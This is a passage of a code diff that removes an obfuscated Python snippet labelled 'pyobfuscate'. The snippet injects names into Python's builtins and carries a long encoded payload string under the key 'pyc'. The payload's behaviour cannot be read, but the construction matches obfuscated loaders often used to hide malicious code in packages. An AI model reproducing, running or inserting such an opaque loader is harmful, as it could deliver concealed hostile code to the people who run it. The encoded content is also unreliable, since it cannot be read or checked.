@@ -1,22 +1,1433 @@
-pyobfuscate=(lambda getattr:[((lambda IIlII,IlIIl:setattr(__builtins__,IIlII,IlIIl))(IIlII,IlIIl)) for IIlII,IlIIl in getattr.items()]);Il=chr(114)+chr(101);lI=r'[^a-zA-Z0-9]';lIl=chr(115)+chr(117)+chr(98)
-pyobfuscate({getattr(__import__(Il),lIl)(lI,'',"https://pyobfuscate.com"):"IlIIIllIIIIIIlIIlIIIlIlllIIlIIIlIll",'pyc':"""Ftg^!RL%m+HxY{8?0LBY7wmXk7yqPR1;c;Ifh7^P>%@MOWxMTNbGdw}by!SZ&9=gJDVnA;Zi{HMs7w_npm4kjFWhY}#xEJtw`^qa7uEWwshdk{bq=L6<hm3)bPrh#)95{u4P10LF}va>-ancDuiF?n@v79XiB@)J9rKV$-a$_Jh-w$;?8*SSIwkxi^s-eRWpGgdF8&?gAq2e_-m)B?WTzSpX8Lk3qPWBLsG%M4w;w9~;~Y4ND2ARe`}Re033XOh&1#$7_Oj}PC{R}BDLEGpx1l*bXL8Ja{YEiwYCYdP_(@#GaCv_!fSWYqR@g92mU&bGk_nZ@UqBsq-#WgU%g9RDP7KD`!HqTbaaCmK?_}J>s?4|Lh-mKFwY<4NJCg|K@5#D<$$`PYQK(AKMr7`+f=V>yk1cMJyz&j)GCO#gcvAP~1_>W@tfmk|U?EQ%av(vcjPmOpLSAsmVe5ivmXh}#aX`?Y%-N{+VOY62VI~Iuo(PYf46A5Yq^0gWOBRWy0u0FS@lrbHvxle{4h0xFQ|*}zJK4&s_)}Jy4O|yPd98+BXj}*`Yn~9hbmZjv1;K-(@%GMEi~P|(4G-8K4q1?H(sKy3k+>lO7CGL;JTV>m#sb>RUPSK0Lf~R4J+NFh`p_^DCm3xonL>>Kb*KRU=ooN}9n3dQMblUgeq!6PsI3&ocAPOrZ^lC;flJGV#)7O)hWr$Lk(5zFdeen@&{ah@Z*K(bBBOnNY+?4sa#q|ywRA&FCJOZ-K*(^*03cTT=yfEE8jcZ64&3){c_OEMQt9oPhe7?ww*(sMc#JF7iN{IS*sg09_AG&u^y&n432Dv-5Ut@nGhN8gi)prfbuN`j@&J#$Ci0mPDNM<pQf{c%W4Y&UYiaNh(JlWfD7!p1@8Jqlc3z0&ZD5z5x4SWJlvlhZB@Wc+PfW)HVLp5zHpi8+(@LGY>?_g`)N3QC=j6NB-jqOSSWVe!QP{tp*eh|GbKML~LUIBE<SxAZx_0_<9^LraCK0>#N6L8&_t+tg#AMY|2`^~#VvisbZSaT1l~AVi*-1Bw@;PzW_|44TvqM0-VoKR&wWHQSUj<@fhivX9w0tnENPWIT<1h1}@6n0L&F1QK(*9wM)bINMu#+cME4y=)+PlZu+mbKOV+$~H{}(CaVmLJeH@F@2+GhiknF1HhNZPXsi@aiU3#p#&ZX-}c>Suv0DaA{sIq=`$u`rN=eE6gV9@faXhV5>7<=jnfqa9?}5%0W_ji;`f#hZ<|x_G@weoBpd<=K1IXU~ef2<IHwzS0Y!km!<J!TrI|BQRAnqj#tk2hELRnSM4@p)dU9u<^?cuwn?v`3j}nmDzI(To+5?tGZv=ph9kj%}TvWdyhh<aa&F%LSE(#FztAf&<l>+Wzy|FmxRm&?}+9J5-i{CP;HF?1N69GB1*C%#5!+TYKrPdtL@JMLU@qw#6#>{>i%tIAWx9)tm{UgAcBwpkF<mi-``E{l^3lN71V6<&<3&1q$-F|x7vFgx@l3L@<>xaX3QB?<@yTYNw58dA<Xx#8zci$gta(z_jklE<~?d7b76=%nG`k+rEi*mf3bneApq#J3PD*Nd;ac=?xM8eFOFmejb`J#x1YrK4!hwSgEg$2b89E$b>%#dBFAls`Vd)9d_y(rwyxyS9>$J&<g)?VaxeY}^luWRfFgSzBbPeCw^s8P7?znK=1Y-WM8`v~^Rripl@dzK!t?(`{MD!ew41EVo$~qa<O1D6WD&rNXJ^2okFL)YYL3;%R3iNvAJcxQZ1bDO@w{jy*zU>-6e<K&^n3&aYJIHY<(QVOoqRUJtf!yF@F*MYWPOZ`!}GAI1}-wBz}?S+ovok-8#ymf^B{~<1#EfaSIC#jZKR;9I4J9ITD?(AX^nTJ(gdi}r;LF@%QCH|Kmug>TQH`M-V{Q`2|Sw8W=C@KXH|RA9Vvbcz@O$chosuOH*%l;7s&b;cf(@3K2C=ArZ=QudNSVFcg5Z6A>RUXtto_1uE?Bl?QXE^E6VCse8m6d#v)!`S^STRhx=h$8~Z$$Hc^2@*|$UDh2&OjYeXIV+Q6jyat|hyyaB8DC7FI6TyR@zO@o5Vc&8DG2#Ovr>iEgDtxf%;GMyR7T1R!V42TN!z_}m!v8FWs;Wzq}*jF|pMv22o=D~}IwCIb}uoVu5qI|4ItV!G~y#wgjohBRZXHVM_XU=cwu%jOI$<ki+xNaI~wNS)AQoLbH)B%DTWG=%ag5ad9e`2|_I-kOj$Fz`cdw$v38N&l!dsj51gAA(<H)1!!4gw*@jq)8#7c7M>(KE1VMLPKq0`_muh#t79hvgN++2H9m@N%EQ4-CJQCEmvohbKOcB&m^AV;qOZIiIvq5qt8;Y}G5Ra(>q2yfnq~Xc*vaR|=(1#g15WD5b*Z5#1;%+wEiF7TCbztB!qTjeKRCR+LOWJ<Mn2R*1H_r%HdO3Zi&%3si)AvrM0)b4};ZE70i)`EL1sz??$6H3tv`sh1^rL;haI>sd6eV^qF~sogDi%~7qh{=XGt(lpZ)OsKIMkT6V{0T|D%`|7g)mo@I$gBPft*d0jJ?oG>o!T%k%Ns>Vle{d=Shg}_Ly5gORxYfzWLl|^6CZ)m8x&;Vv+CJj0CJKohC_1k-<bB%>dH>ZmF$Xg66tW7_hH8Ku@;E+;V(c`h$5I{um9sl0-@mG7gvgM+qU>dbff*}4<kx^X(T97tiTPS-Ak0#=L>rFMe9`a*o2JPVMdsmbmV`I)8OE=d`G|dC1HD=?iZD+rs?_ZuyEHrkgA*uu=KjW2jJNpYG%y3AeJ;9&&JuvQ<$lcHqo<D0K98RV=9yGr9(Emb&N+;H&W?So_Dasyuu8J&*Vd$G@796tYw1_avb(fKg@}T;&TIXG5ph*~npdYOptUc$nXlN!$w@B!73DwfSN)0g)9y6fG)G!q_dC|Br=a{l{fqtl3eyP8gT|;!V~wazZIs<y3zJh}tyyTm^D<#2G$l~SD`Bj52P(LmHO@^r3Bp%O7v5rdZ5CT)gUajv&FIn2>PhyZ6Ws$7tGNy7hmIK!LM`6NCZkoPq_}vELgY3q?7^spE`lOWc_VcbFL6JA8(95Jj^s-2_2-Sq8b!Ii-a2@ea2ahrcz`HE!bdEidFY6kt0pwE;nN0Kx}dWB(}B7?lvN!@rcC}xndRAQR<FhT#%POuj(UjGTMMr)YtReb#wj$|?YH}=nDt!+^r>nQ<lM`r6NHaJSaYj(jK_5Y?U5dCHM*Y%75j!$$iP;K_4vTnx6*+6WW$;-&KU=N)hBYo2Gy~rp+NPpkZW2UR*xsll+;e=WL8qZcZ6Z}O9hvfPIgx+Eu)kZGx<`}cO)i9vA&O;Ex%pwwp=We&<Z`i>qRc|k<~G@ly=_y9=mhhWrhPYoVNjbDBx}5x^w?W0zz%`8uBQet4H+J<&Vow;loRfonw^t!DB#g)q;zM2$}?_B)nHc-q4|*;*m-ObMJnlP&+H0ocb2gLW^vP)ri-xEzvsNB3?C+br<ZgkdpcG^A5?NMb#DAomI(ZKFLEjy<BR!oMh9U@v^R`jCkqq<T7qlwY!rmD&!~%eNM#m${ZE9X)XB-3Plx~hbD9u*<{*Ahy*TirtcSejI(4}1r8_#qs4gjGq!{k3bRPt6NhWXqN2$Aq2yo+E_|fLjwdnDCAzwEPe1IVtDR(^Xg+QL&gqRb<+);+ysW;jW&J)=>)J^V8I!rt0i7RvfrQ7e-(-`#lj`SJcv<e+u)GT-?C8&6I9FWCPBD;+>vPx>lEC(xetR=_{p#uT<;C8|zc0FDWF1Mg(tlo4#G{7`*FTOGxdlD$8N=n-%>N8Il5UUf5(l819JHngEnS^E%~ri_LU2qbLyj}pbT0<?uemN35HUytT!V-vUUOsk(Kr~_%N_qtL%;zW=)G?powFmsWQ;pR=Dk~ZpxY*ste9Cp8Pj)Lj0C6RJ~K6bubFYcB9u9zdv;D<8hJE>(Za$smC;LA#+%mJzFTNV6WFTVQsB&4IlsYWRy;uCdnkKo+UT)Dx8%_;{(}4j@6C2ahPT=2szFC4Hr;d-0acP^8KVg}PF0lFj~hp@)?ttnidGHni?cE5Am0w%8wqx~y_SrnNt>qy-lLvY^ArmTE=<{{gvy}Wjtl2o3zwx&GF}|5T;4C^EcuRm6#|94Z;arbLWiHCF?!D<U5jzv@k@#rIaDZAeng&xqhJPf7-Gh?FEDoWX%nm9{}lXzV|<JsKaZltusX?=WI>`)WiucodRr;5uPH_PKWC|9k|cZq+!xy;+477i;IICq;ttPAl28Tmwzt97=#^DETyU8&9q`2aBduX4U(pT*I|tJ6Z~v5-9-|lwW3HJkfCbRE<^Wh1*lv*~{X8G~=9%=mJB&tBnu#Thkt<B!{$@`As>;!kcXuZ9n6a7%U;|2Mn=*%rIv?YTy5UWV7v$esZcsNg3{BhD#pRD;^mXi5|B}KZqshy|T07$?;8j1vDNYc+_ksBmGgi%04k)a}mPUL89DS>;2qiJ-Uf*xDIA4@hM{-Coe!x^)hKkBr-|@Hxu~+-D%Ail;;`YRaj%0e-n@|<VH%}$-nnodk3l)MJjgi0OO|0JzMd2~($T+BRMcQHu-hw(&*_)xxumRfF!KMkiseI-|Ntnr-dunfbn+S4je3B4k@FD|DO*du)xQ|WkTRFC{Lj<YK<eX+#?g;V%%SpAe+!=TK7~G-xkj?<s^maxFHDw2u^(wgpns_`h-~@1QK2W^H19;u>9df!W(g$2B=Ak$l9x<tZ?CTe29nFaybBBIz8JqVA<UF=Jcf`FSWIUA<Ytft#%fM*$VNGPActgOFO?AFV*H#G)+(~a0*g$B|@9q4Ue#rPZ(YbOlFY`G5nCO5fp)T1_n*@QVVI>3AiW>;^0t_>&!mf2RNzX#`{l&ZgG+NQr>Jfa_L<vRCzF$4UyF*|)l#gBpyJc@QUS4;uUrnjb_2e<7S<K0CX}QqKWNT%f|JF4ohiR`5S9^VGJPq+Dk=iW9mX+U}Os*IBdOX@+kkCH;1YGR!`R{323R3AKgfx<fWC|V-^Wc2#Z3K+sohuz5mfbDj;?p#CthiJtHaA@p3tTJvh43C7(B{f@fE#$ai+HB>p!SHqwL*N$It;-q2qjkoEis;X%e7)57foLrWz6_Zm+69G%+zJtjVr`|)pM2MZ+zdANa!+zTIihn;%;G<N@eh0gg3exs?U+iL1p3et|$5L4MM`Z3{eW7F}<*$lW@q`mB-^~WJj&o#SCo#Fh*iE4N+~4_M!BX>4tSlR-sviST-Z1uEN#d@jQMow)8Xt5aalm;EA30$Z(|see&K|{*-YW@?~U`8S3a798ZaK>eAyFY7Z%z1rnQXbjeWn#$wTEmFtkX)m*B#3Qy`_S4N_ilKReLqd)gIy4xl=P8~xfPUbWAl6Ae#%RPVR6%1ms_Ui$H{B2^8$|e}~30pd6xc~B;>Z2lwC;BTe|A+AeEfrkdFx2$>0;95-fA|Sc?O|sa$gt=Hf2a87)=(bj2rW4HajWlRd_(hj+lK_ozej{v6Ubw@q1qenvNQ0ztTD-@{j5U=3s(ae#<$lk@Cf%*zUGm$#^Dw47%Rw+s?3W%vwp<%-8brxT_)${oriCDvDCVmK~Ci)e3ecV-+_q!I?((X6EMD_J_+I@fX+T5AUQJZ1<m_f<jmp3&qw_rQrN%+l!KI&qJ{OpK+f9mNwX3BOXGQDdd^}Gvv*5#kweh%CJhsB<k;SUaaKNS>b&5?>YQ_30~Fg(VhHu6<0p@JY*J5vxYQC9#>}2}k!EkYsrRIriwE&=f+nJ*#_pVJ#2c0|M)~0CagguAZC{#m`-}W^!y<NbI#`mdM1fPIb|th)2m2lbeZ<#SonR@YNS&zC_UK4tH#Mv1mmIEfOj2$(?Q!~_5@yqUL1i9%qr<7)Zv|+p*cqJhHp2dF_FA2rWL=y<3U-tTmOMAOYK?6LfxfgSYw$IcaJ?0dJzfN8C->?mwUDY(hu{|;tTU|FY#l+22<*-KhwF~|DvEnQPH7!;u2neqv1$`+r;*2RR4y3Tg}G3hylfHHG()BiY4u{ql3~uS@}pJsVh@b=)90)Vzl3dwbj_hY66J}tj*5P=6cj9z_2#WplStufX)V2^it-60M57J(eM6>HmeUYZk$8z?(3<^(UTy;Q2Iym`U(hF5U;nVlMY{k<)JPElq?WZ)WC7yq#tjrg#SS{VRsIV(P+yCRs^Ie!qecxr>hU>qS5WxL!j(o4k;9c;!O#b3j&2B5!dfGDmzYEo9IM^zf=@~6XXgID!20m2x@A*}aWG1=GZf_Fw6p9%U;*B#(ILB*fpeeFnS}g2Gl*62s<$kEX7;B^0T8qsken)(Zm2CM5*`^OrK>mVvzU0{EgP(F_C}h(#$kM2KBd#Ev_9=9ZLMPxs4ca`7hyL;p09%DAC=LJ&m|;#g-h{Xc@u|&FXp7i7d}fk>zTZ(RH7lqow4)kFcQc#E#4TOeZow;Bgp%ERd68$s)Z4p9Ka!zVy<Bi6W6gLodez93Y8`yqwIeNQJvVL;g05!Ng5cbjOFFrAZyl;L-;&<nf0m8Uj_EAsZUO~<AaB`A683sX?dGcHZLRsV3*i?adUwMgg)3yJ(Q|-tlCF<Po-=$^;bt5LTYek<GZDo+Ws2+-wPG7VUV@e#izk}PUK--1m94vNn;45hnF;fvqz(pjkLF<)1OCa8*=5AjEp&8f($3MWZ&8xRzezIL`2!zK@5S%u<b?D??U+PnB{w)$uZaXjoq~jS)4?qG0f$K_ZR4fUT=X!PGiMn^Ewec{QSgU<rJQQ;_wQQx>rJ2nwZB6o9%)p<<ft~thhnu%q$gpOn?{#4~eXM@!5@_%0VFgG<DcYA8n%1?ln?FCyIbM6)|>E8jL3;sZCt@sVwUBWao!3)1KWrc=P}C2>exeWbg693BC?518*?Oe~MYK*jK}Hv!TR<&zhcN=y!ZPS>I|8Fdx`6z*!ze4T{;a+NSHXMMb!T^N5Q^DKG>}HvR#ME`d=un;mNpe^KC+6RP>7J>Xt1XwWJ0xhlmzTRIPqqdb?rHu=|g&J3c)d}jLLi)kWJiFoKW5Gy+7uZ?qk`1YV3;dibO)+jQ?abKSVscL~ZyF1RdM=Ip;7TVSiSo5c@M?X2Yn>nfr&v?T}gdY+g2)|BOZJTZ}Ig1FFj5TGe$3p_(u8!Lp-Zam>mN^1xr^b{f&w!&OK%|4~&%vq|DH7L7aOC>o`j)HZmbPC)!oN=r>ge9dl|mgM+0F?+1mN-<>XOk1v&Gecpe;zjJY|Z6yWC`0q=r6kGKy8cv-THTMYJ=%+EPe@`|Cp+6)D?vF+|M#U(I3<miV00q`WyM^Wy&32r`i0_o+E1V)BLLxjzD%Fn>C8_!vJl?611uDgV~C&q{=VY`lU>%#DS|h1LuF_;%2v>a;<Wc*TA?Rz_HenAw5km91ZwbmsJToGjdruGSH-V;rn|7E6?~>c=iIQSdKiGMG~)ZX;syrD7?)`hUn3k;$FhCf7Vt<{zX#tW_|h`g-pbj7?Qy5B{I3%ZX3*jV2(T)64H60%~n92w{01&E(6N)`+S<T*f;*FGkFTUROFuMi<yPdci!GGvsM(%<Z%0BE?CClB|}UYCN95Htk82-nsSa1aBDbFjj)~7+1nF;QRkr!79LUgIZ_0>Np5M@=r|6M>UJ&@NQTDLXo^dDoaV69GogSuuicm6%zPTK4vIWX612N2<F!ZM?wnu=Y>iSvv)NPIG;292URBE{%TpvPs?Ffd5Vl&j-x=ZVF#Viw2e;tw~L382hSvpoPDT5HR>;|o@VbK(KEf=28r)si8*OtB{RBFd|h1bldNAJWxFXEB9iu3?udN@Ayt&ovkn#VIO!4#y&dgV*%G8wFbdQi2#R4!K7%|~=-#(i9h}2{e+FG$u`Ff;8+Hqqp%WbB?S`UE*?&f1lCytv(Cm0;w{*UA%z*GXsPl&yLo)C%v}&$4zdBrO%|-cpt+7f%M>=tCZM=}ymok0L<8wmsur_}sx6<N|qd%xAn9M1&;sV`2QbR~JwNG>-<jHyRr|6AWPR>kKON5sAVJ9u;6gj?MAk^y4(;v5~meVYq2vg_qjdF|!)@oNt*vN~Y^EiIt1*65J7pDA)6+!FUq%oCi$hSfIt_nWzRNqCl5I0@8wu_;w84uwhgY*5>UPqOP4%JP`goG{@X5NVU*8CxlY&T)lrR}u*XG{diL=h#~k@2o$%eHmT13~6U(*Gx6KH9^cH*7!OclLbGX^3cc>E$_HM>Oj}ub-%g-`}H9wpjX7X-yC(YgwYJcr2IM^ZpVsel11=7NYM<)9hL1$1xSd8D)Fm(uEVk{W;elJpZM~YDx0?MyTblMn2g0`4?|RhzqsPwp-JAH!-M=ozLpf>kF+HoP7&)lX-tDgs)SBJkTp24H177DYt~|b+G28RRDc28~UsS=|g&Ue*a39T444t=ypZKzHup&w#$E<vC1{O`9yM+z-LvArDj?rf1ST(*59V%k#Ca2xDo?XAaQ9Wp7EHC<Xm0o{zVGwSpw)6Ad6?M`wd|*g!L@TM%yY6+P+`=;eUeaaFyS|P#SGPVT7aRiqH~3UU`iN=sOU2(}|_uonN-;eL?#%<+;4QyUfy3Gr>Q!HvC>c*)D)m+_rkkzzy!FDVJ$<XnDV^KjL|LV<0mh8iHqCLQsw~wc2!xYDDtYX%Lb5-IHgzitm^pEg#bLB9-C_Zz)|IL6>wtxd33$Z$AmoI0VaEEBhF;-JpIN(%IRc_nl#Va7l!98|K}K86KycK3P#ktgIv5{Sdzq&xSIWlTyA%J3S?ho-?hb23YLbNcoC_pcxH@8!9a1O=&sW4w`8QciJ~P0bcY{bDov(%J*BTiDz`9biOhp4U3EuVWh&^+q<*O4*H6a`L}YI@_W&k$V}x5eYdv0z(InxSy3*dXc9ZIRfOB!KYTn}L?0T1Vug629XIDbiC*c}^QKEuQ-*Yw-Yz8nom^6hrx<FT@z8b>UP0MD`NOW_esTV$SXsnVCw;Y(l!_ae@v@qW+j8~!Fe9gpMkcZA(piRWxt(u1)}9`UIDP4@i9dUgu|^eXNL(Q6!l%@+-kDl3@%I~gGmA=yY7iNzsQtYoY2zY;9`mY;3x)wfkkOM$hcVbrH1OAmbJ+W_A_Rv8;3SSx`1rCspy3U!cW5c=OO9iU;|Br3^gG%lY(@q#MF2Qatv2LDl~dfRzN&<`VnVyXeeW=)Rc(=jxb^(o78PqitpBZaA{X3l_{C5v14+o*AYl(JoFG;GSfbtPCe+{X_ohJYd#`mCaQpLu;2DD3v@bZkRkkwHWsz0~=~mwrx?~e`*%7b-^G3#c1+-KRz9x?jdy5yrQ@1~vqw4E19n3h8=`#UN91*DU!E2058RfxI!9n@oj&|S)48ZT3mVkIOzo9E*6YeF#@|O5Hm3HUW`!5|srnR_$yk-u*p-%Ycefzmhj_GNRb^F1|#%H}z8UX!MgJ1GspZ=S#UI4!|7j!RLLzUWV0M={Wdoh?Yo&pmvGlBSlmrbY*^RHa!?y&*rXS=Hk$IgMq#tGV{EpWu{_iZy!HMQymS^eN&F4*(8{M6Q?Si0dm#;y0YzA6w$hR=}W9zkWceEL?MDdVV<O7Jc~9w=~ePPB1OEnq+9JL_jG<h)N9T(J<dpWtd41rTsGn9=PVt~up5$s&hY0Mj8n9#|3Igtag0y#4Sjn63i5y|{#F(^h<8mGCH~HGL-Fj2x1P%u2vDtlfCuT;l*)VOoL2_1V%Y;7!}C*m~m4wn2`!5!yn)r&=vzdlrO6kRJ-0_w}46eI5@q_!<EhqCBkwyX;VdAC+(8$$tXU<(j0r!0j&TG6N%#k)8d;q0&I=+a`We+fYIWj-Af{EN4QfH$W#U^4*^ww=`Z8Ij&MLE^^>$u9*>g)(D@Fp_qy&1SwPJU~_%$RcopsD~Ut!H7XLh@kyhm82^E_ZJb}{zO=Maxm{oW9X^WBVf}<XPRnRk@ja?{Vn<c;)qPI_LaY6`dG`e)%^N+16LLz<(s>8}zCXMig(#3#9A4S}#mI>fOxUO~?N$VNY}%i({otN>8k`OiAjCS6f%x7pGp{qXQw#g~ktzP*raQO?GMlbPPo8ko)aGl$&_*^bBD?*oCRiHqCmB#9AJ>@bm??E_?)1uX3>*<IhXKkatcGz?NA2vv<>3}oZJ*>w4go<}PIUnN2#O2h?*8qEO5a>BL`wcXY+V+~w>o0|9_JOa#uLU=`tC#Ln3mTdu1;D7KBW^?3l3zG1txeD4a+q{crj(X&=RQyM?X3U)qI-n$tJt=I=_%?@<U;l$Ls(s$|%7?$W!yShQ84C<x)Eg%C=%-D^IEuF)dnheo6?(U$^tj1RS%*N{7KBgb<=V4X@u5j1E6qL*?v@v$Gz!XBQ{Gs&`rOI$#5D4x32)6m(oZuIN-yk0(^*rIBL)&fr`3C-@L#TE`9c#the~t3jmqa-7(#m(((sOB<H|J;cm>zq0VBkQTR#72-Uf2p~z<!~qF0P7|DJ(|WsTB48#R6(u2(bP>dt@S9#NY(_<cP28}2SlZ$1eUpG=HtX2?%ie`{Kt1C%-aE^g;AP1`U=jbD9Ez_RVQlJtpm>@<j2#krY$8}*d+b>u&>q|Ie$|{WcO5Pr<3B<;EkM71+_)KbRW@w59*qpa;_JEQ_pwhyre`!HX5V&t)n^%#zL<Yrg3FN9?=A|XM$)F3rev=I10<LNja|^&h#F?)6y2KHbl2SC3($hV;@ho5%otjs{S9T<0&0OyixvEG7R>06hl&ZMb~e5f@fk!AV&C{RTe?+=GZT1ZnIvsjEE@5dghEmN99*j9N;n{Z0F4&DqKHrHlawB|B+_F&TX>9Y2lrChJNY|X?tTnNzUPjd+TxZ@m|#fYO&^}LnsLeWaHaP?iLTMo4{5r~0b@+092$g1ZRKRPY<l8tXWDQ^XO-^<BK=D7#l&Dg$<slb+}A#gDEUPl^D7?V4Q2N(?ap+Wg_@m%xp?y{WPiDw{fIbe&?Qm0iz9Cn_kBO*QM7Y3-&}eM;CAPldSig>+C?hapZKLl!hCqE9hLYIo+vTxCts7^LaO>TPO&SMFISnP<RD1Y^$fW6ItpKmk67T!R=Dh#as?xu4iC7n**)^Y7E-Y}uC%#&sY$H(q@srP5F!bhR2+%v3j=G2S+bqd;7tOQT*tp?SnG;8@t~}wqPmx_&%drk^s1I)BFa&a0;NxLl=E1#u54Nfr(Ij4ka5?--tAd**gL@z>C;}XGC^x`{a2XRqF&L*=B6YP?T1h-lO6$;23OLX_4s(KXKm0zn)}6K59R7Jd%<;%=pUnrWJPDO>KX6E(uU)`UidU_M3_HIl9Z`*!#)Q%Nc{jt6!*X5VuySIV=r7pf}!M#XTtj(HacioFRW|eQCa#4IQg_EafZMN(tWB?>-r#K#Es*!W0l$9tbc#3ilJ}b-BrSk(hr0$ZH*b+4#NANKtLZ2M```bXN2yEafK>PRz#T*7$}~j0gAnNW03g?m_5P*QL}OJG5JATe7}`elQ}j=toVz&*>yjlhkfqvExG^@yk2V>xW=ed1Kewd4!q{7cqQ#V7vSH>%k5n#E#A0y#LdIYHya&lZ<uI~&OxKiHdrJ@5<Qw;8f5!{)>I<BVLgj^gsCwvX%<}dd%uH=IyY~a!JHpbkN+po0JOf17NzB|sYU3(svVF}a=W00#CCcD-ttX%x<|Zcf*9U2!Q-=|JR|@FDj1y5&KL!x{)9LRoh*%(?AOgF6erfutCn?Qdw~n`_rk}!=7k_biT?nxb7!w|>jKHDBI>oo0*I!dJ*_~x3=lr?j(<_R6~<5*zSK7$_PEVOw-|GUBBNbt<UT#p2lS-#9n;&b8FNJ+JdZy{kMJ{t+ZNXLs5xrLGV7NzFqr)I+QUBEMLSOn2-$_mP-+-VgCOWwFfHd6*K0>CWj{~A<HSrBq*|BPsL3$W2NG_*l9)W^vB24qj@gE!sOjB<DnjhF(ihGJGAZI~7E`3<{dnH%R{Gy6JFmcOsAy42j0hT%8o>bw$ooj%&b8(?##)dE1t8;lEQC*rgBf(Q7f(J%#GznQf(<=_Cv1h9K9jz<O?&nCD>4G}&w(ws-P@EBGg;u+Zkkfr3X@XT#vLFTpeg<*sU!NhYxL=v16p`;2?q<sexp+22FCMS+fg+UoOf~I!6fccO*%8hc@C;=ff271@ecMRQ>>>W>pN0vdIv+mEfkMQJQ{;aeX0SoZRI7mj4gx^B$lU6zAq8Te1GgZQ*w#l{_;7c5{$9yGXR`hcE?VOog-wO3N^m@L|84{x5R**BIcdvoRS+)ZEa5%o_G+{pxr+*YincF<*aPuOdIZSinBC0VM?aHOBx9iBnVS-4w-g+CvZ>pz{RJOl87{lOd&%q<|It}Zpc1P`f3aQ0$PX!<~y_KvX{%oy9Gp4Vx66h+Q*NQYJ$8TQ;@9%E4upq>2!OZ)Ta&Y$-sw|CwVC2SjG|4$1|mtK?*DV`)svxQy%v)fa*gf_fURJ%l2d}JQ*M=y}FP8t%>Sjp~gjl!(?fUt0F5JTj45rv8h;<Ey-JkOpfO`k-z?8XNBs|*9JXCTcF~WKD&4BDB+$z(Tq&fG1>mEH;iT^9}O4U-saubGDV$TF;hZlTB_$~)oVc2`vo$jqkOX>eR>QQu<Ts4+>ak831S?g2#4EDhyN}_P-T!J=}9<tr0rwZ!DMLu;nD9afaUg(<+2h;@=9r2+XFduUt#j?t;dYST|X&**aAYW9UJ0qt<wP0dYN0pza3I@oU5&Rpi8xLne6BiJ#34uHobkl-p;;OS+US3Vhq8Mx_`KNmfW|A4*yPHboUEL%rhcjc>LJmp32`RR0CbHYk<(D*%D-S^^(Ix3KHZZj^$i6tDQ`kEJAvuiRs4IHWQCT1_=L+;rWgs!~Od`;>S!}t((o~&Zr~Shs2tFRrBy=(ydQrv$1xuhDw@L*{Wc(&YAT_bqMQsXB*Tp0|;QVBr$^P=s5A`m3?`1PUFVv)SuJM*tVu+GvE4;>J?g()9!M8w5@Pj-!KWkKmr6@uBt^svlEHl)6ZjKi)FeARgNFi15WowB!J9Cha?M+hCkXh*y+-@=ASXTfV2XtuPor}ofEMfQyaw%r}WEEeh=xq^bO>rBfRvE8dVBC0Z%39e5T&iu5bn?wk7`Qh8ZkCcth={{w_C6s3)l{U?%WP$%L08IJI?#7yjG^zV6l;ZDIc5w>O(r9<xP6`aPi|04%oD{YUN;+z`rjw-pRAIq`*W*mxOM32O)r#1_Hz&V;NIe3&BT<L)xR?legR3M07e<4p(37*rK=q1HM66&HX8V;9rgaJ@n?Yj0x7Fg6g>r-5rn08k5XGBIChf@tV?vv8ZVI^D<lAEHOsR-}}P5F9>uhZecKB7Jg!F4|FaBFgJ*Ja{&kD94?y41HY9u&P|h_D<CbZsrPfh$VB)v>dBV4>==>BxM)tNaf^>7;zQRsTf{2I}Y5d^#jHp5RamEbSZwKwMAcZBtgg^568ed6pqlKQg@=bt-TkFxpqUaL-M3Vxumi)gi5XLbMud2&?%%B%o+R)lg?~((!-g;Z4!J|cb1oNemBni<U3d>$4~jXzE@scL=T2YdHJ!9)@Wr#6s5etiC?=sQH58Vi|Xmfja=cYcW;4~?Hh8cB?mx`WHSFuPwaW%`FFHF+aMin%`{qDg#J$S5+S@yYghIm2wvB%*e6wj5qZ%$wv$<1-{|4?eIf%P2J%r#uW#v%sPYp&4aDAhJ<!0(Ek9l0U(vNC=^cls>ehYkPGK(di}W^Gng1Dwloz}EnP)o1V<L{hec69jZrhQnc8r^tgoqKioMGe%Wp=jc<r<83L0?@bnz4?rVe^>BtC>$a$=0esv<?x}vzKowVv~2s8ZJEGo$-LAFa~k^>u6PYx)I6K=fvv0@yv`Lg1X~q`eLjK{B|bpcG!=zqK@p}9|Oum&OvAvJ*}C=Dq-LWly(#%GN@~R0+^^Ctp<PRzH>BWbJC6C(A9g6gSPJ5giVy6GD^rDWv_BU6p{T3e=)Mhbn6>W7An<;x<NFBzV&cttvN2XXRN9jEn^!&fT8O1$%YZ$-KN2@3rirszH45h;#OqIyV!^31zW5BBP|Tlvr?>Y<+c*exn(tpg!fjO&#bi#y2j3n2|$<S{-#ro!-(>n+V>ik_53U$P#LZHQUQn}i>Jqe<S=a+*FISK`zfHBGBQby@3>{z4HHbw(}WoH`xduteElZ-!rO`_A$KB=krQdR5Aox>yIm~>)HO=*3ZzbE)~oyQ-;(exl2U$3`x_bty!i=r<8IPz+pGYaXcS*hG$ul8K9vHltPkimFcgYQDsqk_OU4!}&~lr}hwpm;o!>G8Jsnpt*qp<{0XE#q$YCJSPfuJ*2c9Owrf}8Vqmh#k#<8Dcz3%xM%{<z_aQ@|Nf=_|qv37x-Cn?AsNGz?#c82I5%f#lUZGjdLa8gNOEq6v6eKJ_->xO*mpS$q(S?MkAjiQ{GT*<?^9xrQGd_|+Si5PV9;v#{{k%ISc4hO8xj4%$Zbew=ujfs0VpDAs`eb(K#_=lXcJZWnf6eem-j^Cn=PZ2p>qy<*CG4Hg*%`BMmIt<5|gT+9CqNq4Lj&}GmeS&Wt0Jv<{%<exm{bH(aqKF?I@xr1JimnxT{S^0fzi#eCZ6&4{vuNtNUw73s!`_hzgiK00R{{Z(Q9xu5+q{OCGxmeo&$$9@e`NON-ZM1p_5vv|kA4q&yll)E%a^IcO9ov>j3;ptBdZfCTe8?I{2w`HUsbSbu5`B5Eig}UJRGQ{7uK9jg(L`_+<1wg&ItO?C)`)hRwZ)deg-a8UsR2;A09yNaZgmeZL_{|@91I6ny?S1``bg)3G<e`hjaRCg9Z>KDmtN9NmA)UmW4<uuWSfm?xGZH#6c}IJfFqQcQh-Iy^3A554v(tFbHW`SNCH+QkD}|e?U)WT{;5i&CM|cW03Kr;wmcn0rwq36{i0`h5ocMo6lohr)5!=Xd+g)o4yuGq`N!H-UIJ|W&TjfFyEUDZ7qx^ATy%U4Yy|_pr{Pf`iF7iR2r@~a(}G~<59t3rFWs&91ppwQpIB%fP??ZW$}#EF)|IWaalzodXm6c;q{=<3nzV9Q{iYaES)Y_4+b=BYjWOLPC89<+%&y{%M&r$UqsLAyb^ti$G~T-*?UO23m5B0Rm8~Z(KLHd4J~HKjhr1!!t$CG0W^td6#;{t&PtD$RZK231K(OQqqyFwbXK@K-I1+dBvCb-5